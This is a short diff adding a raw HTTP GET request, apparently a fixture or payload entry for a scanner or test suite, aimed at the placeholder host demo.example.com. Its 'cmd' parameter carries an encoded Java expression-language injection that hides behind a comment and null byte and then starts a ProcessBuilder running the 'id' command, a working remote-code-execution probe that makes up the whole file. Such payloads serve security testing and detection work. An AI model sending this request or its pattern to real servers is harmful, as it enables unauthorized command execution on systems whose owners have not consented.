@@ -1,0 +1,4 @@
+GET /a?cmd=%23{/*%00*/new%20java.lang.ProcessBuilder({'id'}).start()} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
